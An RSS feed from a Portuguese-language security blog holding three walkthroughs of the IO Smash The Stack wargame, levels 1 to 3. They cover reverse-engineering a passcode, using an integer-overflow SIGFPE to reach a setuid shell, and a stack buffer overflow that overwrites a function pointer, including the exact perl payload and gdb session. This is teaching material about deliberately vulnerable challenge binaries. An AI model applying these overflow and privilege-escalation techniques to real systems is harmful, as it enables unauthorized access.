<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Wargames on Leonardo Ferreira</title>
    <link>https://ferreirasc.github.io/topics/wargames/</link>
    <description>Recent content in Wargames on Leonardo Ferreira</description>
    <generator>Hugo -- gohugo.io</generator>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Mon, 15 Aug 2016 21:27:03 +0000</lastBuildDate>
    <atom:link href="https://ferreirasc.github.io/topics/wargames/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>[IO Smash The Stack] Level03</title>
      <link>https://ferreirasc.github.io/post/smash_the_stack3/</link>
      <pubDate>Mon, 15 Aug 2016 21:27:03 +0000</pubDate>
      
      <guid>https://ferreirasc.github.io/post/smash_the_stack3/</guid>
      <description>&lt;p&gt;Com o level 2 concluido, temos acesso ao servidor ssh do level03! :-)&lt;/p&gt;

&lt;p&gt;No diretório &amp;ldquo;/levels&amp;rdquo;, vemos dois arquivos associados a esse level: level03 e level03.c.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level3@io:/levels$ ls -la

-r-sr-x---  1 level4  level3   5238 Sep 22  2012 level03

-r--------  1 level3  level3    658 Sep 22  2012 level03.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Um binário de 32-bits com SUID-bit ativo tendo privilégios de level04 (como era de se esperar&amp;hellip;) e um código em C, level03.c.&lt;/p&gt;

&lt;p&gt;Vamos analisar o level03.c:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; //bla, based on work by beach  
 #include &amp;lt;stdio.h&amp;gt;  
 #include &amp;lt;string.h&amp;gt;  
 void good()  
 {  
     puts(&amp;quot;Win.&amp;quot;);  
     execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, NULL);  
 }  
 void bad()  
 {  
     printf(&amp;quot;I&#39;m so sorry, you&#39;re at %p and you want to be at %p\n&amp;quot;, bad, good);  
 }  
 int main(int argc, char **argv, char **envp)  
 {  
     void (*functionpointer)(void) = bad;  
     char buffer[50];  
     if(argc != 2 || strlen(argv[1]) &amp;lt; 4)  
         return 0;  
     memcpy(buffer, argv[1], strlen(argv[1]));  
     memset(buffer, 0, strlen(argv[1]) - 4);  
     printf(&amp;quot;This is exciting we&#39;re going to %p\n&amp;quot;, functionpointer);  
     functionpointer();  
     return 0;  
 }  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos notar que a função &amp;ldquo;good&amp;rdquo; é o goal desse level, já que ela invoca um execl(&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;sh&amp;rdquo;,NULL) que nos daria acesso à um shell com privilégios do processo em execução, que como sabemos, é de level04.&lt;/p&gt;

&lt;p&gt;O código inicia com um ponteiro pra void, functionpointer, que aponta para o endereço de uma função denominada &amp;ldquo;bad&amp;rdquo;. É criado um buffer de 50 caracteres e é feito algumas verificações nos argumentos de entrada do programa (exigindo necessariamente 2 argumentos e uma string de pelo menos 4 caracteres no segundo argumento para que o programa não termine). Nada de interessante até aqui.&lt;/p&gt;

&lt;p&gt;Agora atentemos para essas duas linhas:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;memcpy(buffer, argv[1], strlen(argv[1]));  
memset(buffer, 0, strlen(argv[1]) - 4); 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A função void *memcpy(void *str1, const void *str2, size_t n) é uma conhecida função do C que basicamente copia n caracteres de uma área de memória str2 para uma área de memória str1. No caso do nosso código, estaríamos copiando strlen(argv[1]) bytes, que é justamente o tamanho da string que passaremos como argumento na linha de comando, para dentro da variável buffer de 50 bytes.&lt;/p&gt;

&lt;p&gt;A função void *memset(void *str, int c, size_t n), por sua vez, copia o caracter associado ao inteiro c para os n primeiros caracteres da string apontada por str. No nosso código, estaríamos setando as 4 últimas posições de buffer com &amp;lsquo;0&amp;rsquo;.&lt;/p&gt;

&lt;p&gt;A grande questão a ser observada nessas duas linhas está no fato de que a função memcpy, na forma como foi usada, estará copiando para dentro da variável buffer (de tamanho limitado de 50 bytes) o tamanho da string que eu passar por argumento na linha de comando (strlen(argv[1])), que pode ser tão grande quanto eu queira. O código me permite, então, dar como entrada uma string que extrapolaria o tamanho de buffer e causaria o que chamamos de &amp;ldquo;estouro de buffer&amp;rdquo; ou &amp;ldquo;buffer overflow&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;O código termina printando o endereço para onde functionpointer aponta e chama a função que functionpointer aponta. Numa execução normal, teríamos como saída:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level3@io:/levels$ ./level03 AAAAAAAAAAAAAA
This is exciting we&#39;re going to 0x80484a4
I&#39;m so sorry, you&#39;re at 0x80484a4 and you want to be at 0x8048474
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sendo 0x80484a4 o endereço de &amp;ldquo;bad&amp;rdquo; e 0x8048474 o endereço de &amp;ldquo;good&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Para continuar esse level, vamos lembrar como funciona a stack. Sabemos que todo processo em execução é dividido em quatro regiões bem definidas: texto, dados, stack e heap. A stack é um bloco de memória contíguo que é utilizado para armazenar as variáveis locais das funções de um programa, seus parâmetros, e também o retorno de cada função. Implementando a metodologia LIFO (Last In, First Out), funciona sob os comandos de PUSH (empilhar dado) e POP (desempilhar dado), tendo a característica de &lt;strong&gt;sempre crescer para endereços de memória mais baixos&lt;/strong&gt; para cada PUSH. É de se esperar, então, que todos os parâmetros e variáveis das funções do nosso programa estarão empilhados na stack!&lt;/p&gt;

&lt;p&gt;É importante ressaltar também a importância de alguns registradores que são utilizados no funcionamento da stack:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;EBP: Armazena o endereço da base da stack.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ESP: Aponta para o topo da pilha.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;EIP: Armazena o endereço de retorno das funções.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A stack do nosso programa teria os dados empilhados numa configuração como essa:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Endereços de memória mais baixo
                &amp;lt;----
      (em bytes)
    50         26               4            4      4     4     4     4
| buffer | gcc padding | functionpointer | argc | argv | env | ebp | ret |
      Endereços de memória mais alto
                       ----&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Diante dessas informações, nosso objetivo passa a ser de alguma forma alterar o valor do endereço apontado por functionpointer, que inicialmente aponta para &amp;ldquo;bad&amp;rdquo; (0x80484a4), e fazer com que esse ponteiro aponte para &amp;ldquo;good&amp;rdquo; (de endereço 0x8048474).&lt;/p&gt;

&lt;p&gt;A chave para esse level está na característica da função memcpy() copiar caracteres para o buffer &lt;strong&gt;em direção aos endereços mais altos de memória&lt;/strong&gt;. O que podemos imaginar disso? Que poderemos com uma entrada grande suficiente causar um buffer overflow para sobrescrever o buffer e mais alguns extra paddings com o objetivo de chegar ao endereço apontado por functionpointer! :-D&lt;/p&gt;

&lt;p&gt;Vamos analisar isso pelo gdb:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; level3@io:/levels$ gdb -q level03  
 Reading symbols from /levels/level03...(no debugging symbols found)...done.  
 (gdb) disas main  
 Dump of assembler code for function main:  
   0x080484c8 &amp;lt;+0&amp;gt;:     push  %ebp  
   0x080484c9 &amp;lt;+1&amp;gt;:     mov  %esp,%ebp  
   0x080484cb &amp;lt;+3&amp;gt;:     sub  $0x78,%esp  
   0x080484ce &amp;lt;+6&amp;gt;:     and  $0xfffffff0,%esp  
   0x080484d1 &amp;lt;+9&amp;gt;:     mov  $0x0,%eax  
   0x080484d6 &amp;lt;+14&amp;gt;:     sub  %eax,%esp  
   0x080484d8 &amp;lt;+16&amp;gt;:     movl  $0x80484a4,-0xc(%ebp)  
   0x080484df &amp;lt;+23&amp;gt;:     cmpl  $0x2,0x8(%ebp)  
   0x080484e3 &amp;lt;+27&amp;gt;:     jne  0x80484fc &amp;lt;main+52&amp;gt;  
   0x080484e5 &amp;lt;+29&amp;gt;:     mov  0xc(%ebp),%eax  
   0x080484e8 &amp;lt;+32&amp;gt;:     add  $0x4,%eax  
   0x080484eb &amp;lt;+35&amp;gt;:     mov  (%eax),%eax  
   0x080484ed &amp;lt;+37&amp;gt;:     mov  %eax,(%esp)  
   0x080484f0 &amp;lt;+40&amp;gt;:     call  0x804839c &amp;lt;strlen@plt&amp;gt;  
   0x080484f5 &amp;lt;+45&amp;gt;:     cmp  $0x3,%eax  
   0x080484f8 &amp;lt;+48&amp;gt;:     jbe  0x80484fc &amp;lt;main+52&amp;gt;  
   0x080484fa &amp;lt;+50&amp;gt;:     jmp  0x8048505 &amp;lt;main+61&amp;gt;  
   0x080484fc &amp;lt;+52&amp;gt;:     movl  $0x0,-0x5c(%ebp)  
   0x08048503 &amp;lt;+59&amp;gt;:     jmp  0x8048579 &amp;lt;main+177&amp;gt;  
   0x08048505 &amp;lt;+61&amp;gt;:     mov  0xc(%ebp),%eax  
   0x08048508 &amp;lt;+64&amp;gt;:     add  $0x4,%eax  
   0x0804850b &amp;lt;+67&amp;gt;:     mov  (%eax),%eax  
   0x0804850d &amp;lt;+69&amp;gt;:     mov  %eax,(%esp)  
   0x08048510 &amp;lt;+72&amp;gt;:     call  0x804839c &amp;lt;strlen@plt&amp;gt;  
   0x08048515 &amp;lt;+77&amp;gt;:     mov  %eax,0x8(%esp)  
   0x08048519 &amp;lt;+81&amp;gt;:     mov  0xc(%ebp),%eax  
   0x0804851c &amp;lt;+84&amp;gt;:     add  $0x4,%eax  
   0x0804851f &amp;lt;+87&amp;gt;:     mov  (%eax),%eax  
   0x08048521 &amp;lt;+89&amp;gt;:     mov  %eax,0x4(%esp)  
   0x08048525 &amp;lt;+93&amp;gt;:     lea  -0x58(%ebp),%eax  
   0x08048528 &amp;lt;+96&amp;gt;:     mov  %eax,(%esp)  
   0x0804852b &amp;lt;+99&amp;gt;:     call  0x804838c &amp;lt;memcpy@plt&amp;gt;  
   0x08048530 &amp;lt;+104&amp;gt;:     mov  0xc(%ebp),%eax  
   0x08048533 &amp;lt;+107&amp;gt;:     add  $0x4,%eax  
   0x08048536 &amp;lt;+110&amp;gt;:     mov  (%eax),%eax  
   0x08048538 &amp;lt;+112&amp;gt;:     mov  %eax,(%esp)  
   0x0804853b &amp;lt;+115&amp;gt;:     call  0x804839c &amp;lt;strlen@plt&amp;gt;  
   0x08048540 &amp;lt;+120&amp;gt;:     sub  $0x4,%eax  
   0x08048543 &amp;lt;+123&amp;gt;:     mov  %eax,0x8(%esp)  
   0x08048547 &amp;lt;+127&amp;gt;:     movl  $0x0,0x4(%esp)  
   0x0804854f &amp;lt;+135&amp;gt;:     lea  -0x58(%ebp),%eax  
   0x08048552 &amp;lt;+138&amp;gt;:     mov  %eax,(%esp)  
   0x08048555 &amp;lt;+141&amp;gt;:     call  0x804835c &amp;lt;memset@plt&amp;gt;  
   0x0804855a &amp;lt;+146&amp;gt;:     mov  -0xc(%ebp),%eax  
   0x0804855d &amp;lt;+149&amp;gt;:     mov  %eax,0x4(%esp)  
   0x08048561 &amp;lt;+153&amp;gt;:     movl  $0x80486c0,(%esp)  
   0x08048568 &amp;lt;+160&amp;gt;:     call  0x80483ac &amp;lt;printf@plt&amp;gt;  
   0x0804856d &amp;lt;+165&amp;gt;:     mov  -0xc(%ebp),%eax  
   0x08048570 &amp;lt;+168&amp;gt;:     call  *%eax  
   0x08048572 &amp;lt;+170&amp;gt;:     movl  $0x0,-0x5c(%ebp)  
   0x08048579 &amp;lt;+177&amp;gt;:     mov  -0x5c(%ebp),%eax  
   0x0804857c &amp;lt;+180&amp;gt;:     leave   
   0x0804857d &amp;lt;+181&amp;gt;:     ret    
 End of assembler dump.  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver claramente uma call de memcpy() em 0x0804852b. É ali que minha string passada como parâmetro vai ser copiada para dentro de buffer.&lt;/p&gt;

&lt;p&gt;Dando um break imediatamente após a cópia desses valores por memcpy(), rodando o programa com uma string &amp;ldquo;BBBB&amp;rdquo; e analisando a stack partindo de seu topo (%esp)&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; (gdb) b *0x08048530  
 Breakpoint 1 at 0x8048530  
 (gdb) r BBBB  
 Starting program: /levels/level03 BBBB  
 Breakpoint 1, 0x08048530 in main ()  
 (gdb) x/28x $esp  
 0xbffffc40:     0xbffffc60     0xbffffe8b     0x00000004     0x00000001  
 0xbffffc50:     0xb7fff908     0xbffffc86     0xbffffc90     0xb7ef19dc  
 0xbffffc60:     0x42424242     0xb7e9e5f5     0xbffffc87     0x00000001  
 0xbffffc70:     0x00000000     0x080497c8     0xbffffc88     0x08048338  
 0xbffffc80:     0xb7ff0590     0x080497c8     0xbffffcb8     0x080485a9  
 0xbffffc90:     0xb7fcf324     0xb7fceff4     0x08048590     0xbffffcb8  
 0xbffffca0:     0xb7e9e7f5     0xb7ff0590     0x0804859b     0x080484a4  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahá!&lt;/p&gt;

&lt;p&gt;Temos que nosso buffer inicia em &lt;strong&gt;0xbffffc60&lt;/strong&gt;, já que encontramos o valor &lt;strong&gt;0x42424242&lt;/strong&gt; que correspondem aos 4 bytes &amp;ldquo;BBBB&amp;rdquo; que demos como entrada (perceba que 42 corresponde a letra &amp;lsquo;B&amp;rsquo; em hexadecimal). Além disso, podemos enxergar também o valor de functionpointer em &lt;strong&gt;0xbffffcaf&lt;/strong&gt;, que armazena o valor 0x80484a4, correspondente a função &amp;ldquo;bad&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;A jogada agora é utilizar do stack-based buffer overflow para sobrescrever esses paddings até o conteúdo de functionpointer, e aí, então, modificar seu conteúdo pelo endereço de &amp;ldquo;good&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; level3@io:/levels$ ./level03 `perl -e &#39;print &amp;quot;B&amp;quot;x76,&amp;quot;\x74\x84\x04\x08&amp;quot;&#39;`  
 This is exciting we&#39;re going to 0x8048474  
 Win.  
 sh-4.2$  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Win! Agora temos acesso à um shell com privilégio de level4! :-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>[IO Smash The Stack] Level02</title>
      <link>https://ferreirasc.github.io/post/smash_the_stack2/</link>
      <pubDate>Mon, 15 Aug 2016 21:16:03 +0000</pubDate>
      
      <guid>https://ferreirasc.github.io/post/smash_the_stack2/</guid>
      <description>&lt;p&gt;Com o level01 concluido, obtemos acesso ao shell que nos provê permissões para visualizar a senha do level02.&lt;/p&gt;

&lt;p&gt;Conectando ao servidor ssh do level2, observamos 4 arquivos associados a esse level: dois binários SUID de 32-bits, level02 e level02_alt, e seus códigos C correspondentes, level02.c e level02_alt.c. Nesse post estarei focando no level02.c e seu binário level02, que é uma das duas formas de concluir esse nível.&lt;/p&gt;

&lt;p&gt;Para começar, vamos analisar o código level02.c:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; //a little fun brought to you by bla 

 #include &amp;lt;stdio.h&amp;gt; 

 #include &amp;lt;stdlib.h&amp;gt; 

 #include &amp;lt;signal.h&amp;gt; 

 #include &amp;lt;setjmp.h&amp;gt; 

 void catcher(int a) 

 { 

     setresuid(geteuid(),geteuid(),geteuid()); 

     printf(&amp;quot;WIN!\n&amp;quot;); 

     system(&amp;quot;/bin/sh&amp;quot;); 

     exit(0); 

 } 

 int main(int argc, char **argv) 

 { 

     puts(&amp;quot;source code is available in level02.c\n&amp;quot;); 

     if (argc != 3 || !atoi(argv[2])) 

         return 1; 

     signal(SIGFPE, catcher); 

     return abs(atoi(argv[1])) / atoi(argv[2]); 

 } 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Uma simples análise do código acima nos mostra que o objetivo desse nível é fazer com que de alguma forma a função &amp;ldquo;catcher&amp;rdquo; seja chamada. Como se trata de um binário SUID que possui permissões de level03 (visualize isso com ls -la) a linha:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;setresuid(geteuid(),geteuid(),geteuid())
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Faria com que o EUID fosse setado para o EUID do dono do binário, que possui permissões de level03. Vemos que na linha seguinte é feito a chamada de um shell (com permissões de level03) que nos daria acesso a senha do próximo nível. Mas como essa função pode ser chamada?&lt;/p&gt;

&lt;p&gt;A única forma possível da função &amp;ldquo;catcher&amp;rdquo; ser chamada parece ser como handling na chamada da função signal() com o argumento SIGFPE. Um SIGFPE é um dos diversos Program Error Signals gerados pelo sistema operacional quando algum erro fatal é encontrado num programa, assim como o SIGILL, SIGSEGV, SIGABRT, SIGIOT, and so on. O SIGFPE, em específico, é um sinal gerado quando temos um fatal arithmetic error (como divisão por zero) ou também um overflow. Mais informações: Program Error Signals - The GNU C Library.&lt;/p&gt;

&lt;p&gt;A função signal(), contida na biblioteca signal.h, nos permite &amp;ldquo;tratar&amp;rdquo; um determinado sinal ocorrido no programa, com uma função handling qualquer passada como argumento. Essa função será a resposta comportamental do programa à um determinado sinal gerado, que no caso do código do desafio, a função signal(SIGFPE, catcher) nos diz que assim que um SIGFPE for gerado, a função catcher será chamada. Ou seja&amp;hellip; precisamos gerar um SIGFPE!&lt;/p&gt;

&lt;p&gt;O código é pequeno, de forma que não é díficil observar que a única linha de código que poderia nos gerar um sinal desse tipo é&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;return abs(atoi(argv[1])) / atoi(argv[2]); 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;que simplesmente divide as conversões em inteiro, com atoi(), da string do primeiro argumento da linha de comando com a string do segundo argumento. É feito o retorno do módulo dessa divisão. Podemos imaginar de cara que uma entrada como &amp;ldquo;./level02 1 0&amp;rdquo; nos daria um SIGFPE por essa linha&amp;hellip; de fato daria, exceto pela condição imposta no programa de que o inteiro associado ao segundo argumento por atoi() NÃO pode ser nulo:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if (argc != 3 || !atoi(argv[2])) 

         return 1;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Além da condição de exatamente três argumentos na linha de comando (contando com a execução do binário), é claro. Caso alguma dessas condições não seja satisfeita, o programa finalizará sem nenhuma chance de conseguirmos acesso a função catcher. Infelizmente, podemos descartar a divisão por zero.&lt;/p&gt;

&lt;p&gt;A saída então seria gerarmos um overflow. Para isso, precisamos lembrar que no C-ANSI o tipo int é representado por 4 bytes, ou seja, 32-bits (isso pode ser visto com sizeof(int)). Portanto, temos 232 possíveis valores, que numa representação com sinal seriam:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.sciweavers.org/upload/Tex2Img_1471307845/render.png&#34; alt=&#34;equation&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Já que o bit mais significativo é reservado para representação do sinal do inteiro.&lt;/p&gt;

&lt;p&gt;Isso nos dá um intervalo de -2147483648 a 2147483647, que são valores condizentes com as constantes INT_MIN e INT_MAX definidos pelo C e contidos na biblioteca limits.h. Obviamente, o limite mínimo é superior em módulo ao limite máximo por uma unidade, por conta da representação do zero.&lt;/p&gt;

&lt;p&gt;Um exemplo de um overflow seria uma representação fora desse intervalo de valores possíveis, como por exemplo 2147483648. Esse valor não existe e extrapola o limite máximo de um inteiro no C-Ansi. De fato, esse valor pode ser obtido se entrarmos com &amp;ldquo;./level02 -2147483648 -1&amp;rdquo;, que diferente da divisão por zero, não invalida a condição de execução do programa. A divisão desses dois valores na penúltima linha faria um overflow do tipo inteiro e geraria um SIGFPE pelo sistema operacional que seria suficiente para acionar a função signal(), que tem como handling a nossa almejada &amp;ldquo;catcher&amp;rdquo;. Entrando com esses dois argumentos:&lt;/p&gt;


&lt;img class=&#34;pure-img&#34; src=&#34;../images/smash02_tela1.png&#34; alt=&#34;&#34;&gt;


&lt;p&gt;Um shell é aberto e agora temos permissão para visualizar a senha do level03!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>[IO Smash The Stack] Level01</title>
      <link>https://ferreirasc.github.io/post/smash_the_stack1/</link>
      <pubDate>Mon, 15 Aug 2016 20:45:03 +0000</pubDate>
      
      <guid>https://ferreirasc.github.io/post/smash_the_stack1/</guid>
      <description>&lt;p&gt;O &amp;ldquo;IO Smash The Stack&amp;rdquo; é um conhecido wargame da Smash The Stack Network. Um &amp;ldquo;wargame&amp;rdquo;, na cultura hacker, é o nome dado a um jogo contendo desafios de segurança, geralmente divididos em níveis (levels), no quais se deve explorar alguma vulnerabilidade para conseguir acesso aos próximos níveis. Obviamente, a dificuldade dos desafios evolui a cada nível, o que torna as coisas mais divertidas.&lt;/p&gt;

&lt;p&gt;Eu particularmente gosto bastante do IO Smash The Stack por ser um wargame mais &amp;ldquo;maduro&amp;rdquo; e realístico, bem diferente da maioria dos wargames que se vê por aí&amp;hellip;&lt;/p&gt;

&lt;p&gt;Para começar a brincar, temos que utilizar de um ssh-client para nos conectar ao primeiro level (o login e a senha para o primeiro level é informado na página do wargame):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;       ___        /  /\    
      /__/\      /  /::\   
      \__\:\    /  /:/\:\  
      /  /::\  /  /:/  \:\ 
   __/  /:/\/ /__/:/ \__\:\
  /__/\/:/~~  \  \:\ /  /:/
  \  \::/      \  \:\  /:/ 
   \  \:\       \  \:\/:/  
    \__\/        \  \::/   
                  \__\/    

ssh  level1@io.smashthestack.org

password: level1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logo que conectamos ao wargame, estaremos em um diretório com vários arquivos README (de diferentes formatos), que nos informam as especificações para jogar.&lt;/p&gt;

&lt;p&gt;Navegando pelos diretórios, chegamos a pasta &amp;ldquo;levels&amp;rdquo; (contida na raiz), e assim iniciamos o level1. Listando os arquivos do diretório, vemos que a única referência ao level1 é um ELF (32-bit) executável:&lt;/p&gt;


&lt;img class=&#34;pure-img&#34; src=&#34;../images/smash01_tela1.png&#34; alt=&#34;&#34;&gt;


&lt;p&gt;Ao executá-lo, o programa nos pede um passcode de 3 dígitos para que &amp;ldquo;algo&amp;rdquo; aconteça. Caso os 3 dígitos informados não sejam o passcode esperado, o programa é simplesmente finalizado.&lt;/p&gt;

&lt;p&gt;A única certeza que temos é: Algo está escondido nesse arquivo ELF.&lt;/p&gt;

&lt;p&gt;Um arquivo ELF nada mais é que um formato padrão de arquivos executáveis, códigos objetos, core dumps, shared objects. É utilizado desde 1999 como o formato padrão de arquivos binários para sistemas Unix e Unix-like.&lt;/p&gt;

&lt;p&gt;O arquivo ELF do tipo executável é essencialmente um object file pronto para ser executado, daqueles que obtemos com &amp;ldquo;gcc codigo.c -o codigo&amp;rdquo;. Todo arquivo ELF é dividido em headers e sections. As sections estruturalmente variam de acordo com o tipo do arquivo ELF, que no caso de um executável, temos algumas interessantes para avaliação:&lt;/p&gt;

&lt;p&gt;.text - Descreve as instruções do programa executável.
.symbol - Tabela de símbolos utilizada (importada e exportada).
.rel* - Onde os símbolos são utilizados
.data e .data1 - Onde ficará as variáveis globais
.rodata - Onde geralmente contém strings constantes (read-only).&lt;/p&gt;

&lt;p&gt;Um bom programa para análise de sections é o objdump, que faz parte da coleção de binários disponibilizados pela GNU Binary Utilities (ou binutils). Além de nos prover informações interessantes das sections de um ELF, ele também permite a opção de disassembler para converter códigos de máquina em códigos de montagem. Com essa opção, estamos aptos a &amp;ldquo;enxergar&amp;rdquo; o executável na sua forma assembly.&lt;/p&gt;

&lt;p&gt;Voltemos ao ELF do desafio, utilizando o disassembler do objdump (objdump -d level01):&lt;/p&gt;


&lt;img class=&#34;pure-img&#34; src=&#34;../images/smash01_tela2.png&#34; alt=&#34;&#34;&gt;


&lt;p&gt;Na imagem acima, o código assembly obtido do disassembly da section .text, parece nos dizer tudo que é realizado desde a execução ao término do programa.&lt;/p&gt;

&lt;p&gt;Primeiro é dado um PUSH de um endereço 0x8049128 na stack. Em seguida é feito uma chamada de uma função, a função &amp;ldquo;puts&amp;rdquo; (que exibe algo na tela&amp;hellip; você deveria estar imaginando que fosse o texto pedindo que eu digitasse o passcode de 3 dígitos). Na terceira linha, novamente um call, dessa vez de um fscanf que provavelmente é a função responsável pela leitura do passcode que eu digitar.&lt;/p&gt;

&lt;p&gt;Na quarta linha, temos uma comparação CMP de um valor em hexadecimal com o conteúdo do registrador EAX. E na quinta linha, um jump do tipo &amp;ldquo;je&amp;rdquo; (salte para &amp;ldquo;You Win&amp;rdquo; de endereço 80480dc se os valores comparados em CMP forem iguais). A instrução CMP do 8086 combinada com um jump é uma conhecida forma de controle de fluxo no assembly, que permite com que o programa tome certas decisões, podendo alterar o seu curso de acordo com o resultdo da comparação. Caso a comparação não seja satisfeita, o jump não é feito, e caimos na sexta linha em que é chamada a função EXIT para sair do programa.&lt;/p&gt;

&lt;p&gt;Após a análise do código assembly não é preciso muito para entender que o passcode é o valor decimal de 0x10f, já que digitando esse valor conseguiriamos sair do CMP em direção a função &amp;ldquo;You Win&amp;rdquo;. O valor decimal correspondente a 10f é 271.&lt;/p&gt;

&lt;p&gt;Entrando com 271 como passcode recebemos a mensagem:&lt;/p&gt;


&lt;img class=&#34;pure-img&#34; src=&#34;../images/smash01_tela3.png&#34; alt=&#34;&#34;&gt;


&lt;p&gt;Um shell é aberto, e agora temos permissão para acessar a senha do level2 em &amp;ldquo;/home/level2/.pass&amp;rdquo;.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>